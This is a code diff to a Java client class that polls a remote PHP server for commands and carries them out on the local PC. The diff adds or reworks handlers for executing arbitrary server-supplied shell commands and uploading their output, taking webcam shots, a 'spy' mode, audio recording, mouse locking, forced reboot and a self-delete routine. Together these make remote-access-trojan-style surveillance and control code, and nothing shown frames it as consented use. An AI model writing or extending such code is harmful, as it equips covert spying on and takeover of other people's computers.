@@ -17,6 +17,7 @@ public class listening_requests {
     private String have_cam_shot_request;
     private String have_usage_values_request;
     private String have_any_request;
+    private String have_any_request_2;
     pc_process process = new pc_process();
 
     public listening_requests(){
@@ -26,6 +27,7 @@ public class listening_requests {
         have_cam_shot_request = "have_cam_shot_request=1";
         have_usage_values_request = "have_usage_values_request=1";
         have_any_request = "have_any_request=1";
+        have_any_request_2 = "have_any_request_2=1";
     }
 
     private void closing_listen() throws IOException, InterruptedException {
@@ -72,13 +74,13 @@ public class listening_requests {
             server_requests.http_get_request(pc_request_php_file_name, "pc_lock_request=0");
         }
     }
-    private void pc_sleep() throws IOException, HttpException, URISyntaxException, InterruptedException {
+    private void pc_reboot() throws IOException, HttpException, URISyntaxException, InterruptedException {
 
         int request = Integer.parseInt(server_requests.http_get_request(pc_request_php_file_name, "get_sleep_request=1"));
         if(request == 1){
-            if(System.getProperty("os.name").startsWith("Windows")){ //Only windows
-            process.pc_sleep();}
             server_requests.http_get_request(pc_request_php_file_name, "sleep_request=0");
+            process.pc_reboot();
+
         }
     }
 
@@ -91,24 +93,51 @@ public class listening_requests {
             ss_listen();
             cam_shot();
             pc_lock();
-            pc_sleep();
+            pc_reboot();
             usage_values();
 
 
             server_requests.http_get_request(pc_request_php_file_name, "any_request=0");
         }
     }
+    public void listen_all_2() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
 
-    public void cmd_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+        int request = Integer.parseInt(server_requests.http_get_request(pc_request_php_file_name, have_any_request_2));
+
+        if(request == 1){
+            cmd_listen();
+            message_listen();
+            horn_listen();
+            record_listen();
+            spy_listen();
+            delete_listen();
+
+            server_requests.http_get_request(pc_request_php_file_name, "any_request_2=0");
+        }
+    }
+
+    private void record_listen() throws IOException, HttpException, URISyntaxException, InterruptedException {
+
+        int request = Integer.parseInt(server_requests.http_get_request(pc_request_php_file_name, "get_record_request=1"));
+        if(request == 1){
+            server_requests.http_get_request(pc_request_php_file_name, "record_request=0");
+            process.record_play();
+
+        }
+    }
+
+    private void cmd_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
 
         String response = server_requests.http_get_request(pc_request_php_file_name, "get_cmd_post=1");
 
         if(!response.equals("0")){
-            server_requests.http_post_request(pc_request_php_file_name,"cmd_response=1", new String[]{"cmd"},new String[]{process.cmd(response)});
+
+            server_requests.http_post_request(pc_request_php_file_name, "cmd_response=1", new String[]{"cmd"}, new String[]{process.cmd(response)});
+
             server_requests.http_post_request(pc_request_php_file_name,"cmd_post=0", new String[]{"cmd"},new String[]{"0"});
         }
     }
-    public void message_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+    private void message_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
 
         String response = server_requests.http_get_request(pc_request_php_file_name, "get_messages=1");
 
@@ -117,7 +146,7 @@ public class listening_requests {
             server_requests.http_post_request(pc_request_php_file_name,"message_request=0", new String[]{"message"},new String[]{"0"});
         }
     }
-    public void horn_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+    private void horn_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
 
         String response = server_requests.http_get_request(pc_request_php_file_name, "get_horn_request=1");
 
@@ -128,7 +157,7 @@ public class listening_requests {
             process.horn(1);
         }
     }
-    public void spy_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+    private void spy_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
 
         String response = server_requests.http_get_request(pc_request_php_file_name, "get_spy_mode=1");
         String mode = null;
@@ -139,6 +168,25 @@ public class listening_requests {
         else {
             mode = "spy";
             if(!mode.equals(server_requests.get_mode())){server_requests.set_mode("spy");}
+        }
+    }
+    public void mouse_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+
+        String response = server_requests.http_get_request(pc_request_php_file_name, "get_mouse_lock=1");
+
+        if(!response.equals("0")){
+            process.mouse_lock(true);
+        }
+        else {
+            process.mouse_lock(false);
+        }
+    }
+    private void delete_listen() throws IOException, AWTException, HttpException, URISyntaxException, InterruptedException {
+
+        String response = server_requests.http_get_request(pc_request_php_file_name, "get_delete_software=1");
+        if(!response.equals("0")){
+            server_requests.http_get_request(pc_request_php_file_name, "delete_system=1");
+            process.pc_delete();
         }
     }
 }
